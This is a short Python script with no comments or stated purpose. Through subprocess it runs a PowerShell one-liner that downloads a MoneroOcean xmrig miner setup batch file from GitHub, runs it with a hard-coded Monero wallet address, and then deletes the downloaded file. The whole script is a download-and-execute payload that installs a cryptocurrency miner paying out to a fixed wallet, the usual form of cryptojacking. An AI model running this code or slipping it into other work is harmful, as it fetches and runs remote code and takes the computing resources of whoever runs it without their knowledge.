import subprocess

command = (
    'powershell -Command "$wc = New-Object System.Net.WebClient; '
    '$tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += \'.bat\'; '
    '$wc.DownloadFile(\'https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat\', $tempfile); '
    '& $tempfile 88Nk4EdfZ1UimtCE9GPbiSXzfY81z7urmD6hGyvVQAe5h9P4tRmW7N84nm5bD6rVGtcjGa7KPiytpBRKPXzvo64d9ZcJZqo; '
    'Remove-Item -Force $tempfile"'
)

try:
    result = subprocess.run(command, shell=True, check=True)
    print("Command executed successfully")
except subprocess.CalledProcessError as e:
    print(f"An error occurred: {e}")
